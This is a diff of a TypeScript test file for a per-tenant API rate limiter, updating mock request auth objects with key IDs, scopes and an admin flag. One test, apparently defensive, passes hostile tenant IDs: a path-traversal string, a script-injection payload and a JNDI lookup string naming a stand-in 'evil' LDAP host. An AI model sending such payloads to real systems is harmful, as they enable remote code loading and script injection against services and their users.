@@ -13,14 +13,14 @@ interface MockResponse extends Partial<Response> {
   headersSent: boolean;
 }
 
-function createMockReq(overrides: Partial<Request & { auth?: { tenantId?: string } }> = {}): Request {
+function createMockReq(overrides: Partial<Request & { auth?: { tenantId: string; apiKeyId: string; scopes: string[]; isFleetAdmin: boolean } }> = {}): Request {
   return {
     method: 'POST',
     path: '/api/v1/playbooks',
     ip: '203.0.113.50',
     socket: { remoteAddress: '203.0.113.50' },
     headers: {},
-    auth: { tenantId: 'tenant-a' },
+    auth: { tenantId: 'tenant-a', apiKeyId: 'test-key', scopes: ['read'], isFleetAdmin: false },
     ...overrides,
   } as Request;
 }
@@ -59,13 +59,13 @@ describe('createTenantRateLimiter', () => {
     const limiter = createTenantRateLimiter({ windowMs: 1000, maxRequests: 2 });
 
     const res1 = createMockRes();
-    await limiter(createMockReq({ auth: { tenantId: 'tenant-a' } }), res1 as Response, next);
+    await limiter(createMockReq({ auth: { tenantId: 'tenant-a', apiKeyId: 'test-key', scopes: ['read'], isFleetAdmin: false } }), res1 as Response, next);
 
     const res2 = createMockRes();
-    await limiter(createMockReq({ auth: { tenantId: 'tenant-a' } }), res2 as Response, next);
+    await limiter(createMockReq({ auth: { tenantId: 'tenant-a', apiKeyId: 'test-key', scopes: ['read'], isFleetAdmin: false } }), res2 as Response, next);
 
     const res3 = createMockRes();
-    await limiter(createMockReq({ auth: { tenantId: 'tenant-a' } }), res3 as Response, next);
+    await limiter(createMockReq({ auth: { tenantId: 'tenant-a', apiKeyId: 'test-key', scopes: ['read'], isFleetAdmin: false } }), res3 as Response, next);
 
     expect(next).toHaveBeenCalledTimes(2);
     expect(res3.statusCode).toBe(429);
@@ -80,10 +80,10 @@ describe('createTenantRateLimiter', () => {
     const limiter = createTenantRateLimiter({ windowMs: 1000, maxRequests: 1 });
 
     const res1 = createMockRes();
-    await limiter(createMockReq({ auth: { tenantId: 'tenant-a' } }), res1 as Response, next);
+    await limiter(createMockReq({ auth: { tenantId: 'tenant-a', apiKeyId: 'test-key', scopes: ['read'], isFleetAdmin: false } }), res1 as Response, next);
 
     const res2 = createMockRes();
-    await limiter(createMockReq({ auth: { tenantId: 'tenant-b' } }), res2 as Response, next);
+    await limiter(createMockReq({ auth: { tenantId: 'tenant-b', apiKeyId: 'test-key', scopes: ['read'], isFleetAdmin: false } }), res2 as Response, next);
 
     expect(next).toHaveBeenCalledTimes(2);
     expect(res1.statusCode).toBe(200);
@@ -112,7 +112,7 @@ describe('createTenantRateLimiter', () => {
     const res1 = createMockRes();
     await limiter(
       createMockReq({
-        auth: { tenantId: 'tenant-a' },
+        auth: { tenantId: 'tenant-a', apiKeyId: 'test-key', scopes: ['read'], isFleetAdmin: false },
         headers: { 'x-tenant-id': ['tenant-a', 'tenant-b'] },
       }),
       res1 as Response,
@@ -122,7 +122,7 @@ describe('createTenantRateLimiter', () => {
     const res2 = createMockRes();
     await limiter(
       createMockReq({
-        auth: { tenantId: 'tenant-a' },
+        auth: { tenantId: 'tenant-a', apiKeyId: 'test-key', scopes: ['read'], isFleetAdmin: false },
         headers: { 'x-tenant-id': ['tenant-b', 'tenant-a'] },
       }),
       res2 as Response,
@@ -137,10 +137,10 @@ describe('createTenantRateLimiter', () => {
     const limiter = createTenantRateLimiter({ windowMs: 1000, maxRequests: 1 });
 
     const res1 = createMockRes();
-    await limiter(createMockReq({ auth: { tenantId: 'tenant-1' } }), res1 as Response, next);
+    await limiter(createMockReq({ auth: { tenantId: 'tenant-1', apiKeyId: 'test-key', scopes: ['read'], isFleetAdmin: false } }), res1 as Response, next);
 
     const res2 = createMockRes();
-    await limiter(createMockReq({ auth: { tenantId: 'TENANT-1' } }), res2 as Response, next);
+    await limiter(createMockReq({ auth: { tenantId: 'TENANT-1', apiKeyId: 'test-key', scopes: ['read'], isFleetAdmin: false } }), res2 as Response, next);
 
     expect(next).toHaveBeenCalledTimes(1);
     expect(res2.statusCode).toBe(429);
@@ -151,21 +151,21 @@ describe('createTenantRateLimiter', () => {
 
     const res1 = createMockRes();
     await limiter(
-      createMockReq({ auth: { tenantId: '../tenant-a' }, ip: '198.51.100.9' }),
+      createMockReq({ auth: { tenantId: '../tenant-a', apiKeyId: 'test-key', scopes: ['read'], isFleetAdmin: false }, ip: '198.51.100.9' }),
       res1 as Response,
       next
     );
 
     const res2 = createMockRes();
     await limiter(
-      createMockReq({ auth: { tenantId: '<script>alert(1)</script>' }, ip: '198.51.100.9' }),
+      createMockReq({ auth: { tenantId: '<script>alert(1)</script>', apiKeyId: 'test-key', scopes: ['read'], isFleetAdmin: false }, ip: '198.51.100.9' }),
       res2 as Response,
       next
     );
 
     const res3 = createMockRes();
     await limiter(
-      createMockReq({ auth: { tenantId: '${jndi:ldap://evil}' }, ip: '198.51.100.9' }),
+      createMockReq({ auth: { tenantId: '${jndi:ldap://evil}', apiKeyId: 'test-key', scopes: ['read'], isFleetAdmin: false }, ip: '198.51.100.9' }),
       res3 as Response,
       next
     );
@@ -179,14 +179,14 @@ describe('createTenantRateLimiter', () => {
 
     const res1 = createMockRes();
     await limiter(
-      createMockReq({ auth: { tenantId: 'tenant-a' }, ip: '198.51.100.10' }),
+      createMockReq({ auth: { tenantId: 'tenant-a', apiKeyId: 'test-key', scopes: ['read'], isFleetAdmin: false }, ip: '198.51.100.10' }),
       res1 as Response,
       next
     );
 
     const res2 = createMockRes();
     await limiter(
-      createMockReq({ auth: { tenantId: 'tenant-a' }, ip: '198.51.100.11' }),
+      createMockReq({ auth: { tenantId: 'tenant-a', apiKeyId: 'test-key', scopes: ['read'], isFleetAdmin: false }, ip: '198.51.100.11' }),
       res2 as Response,
       next
     );
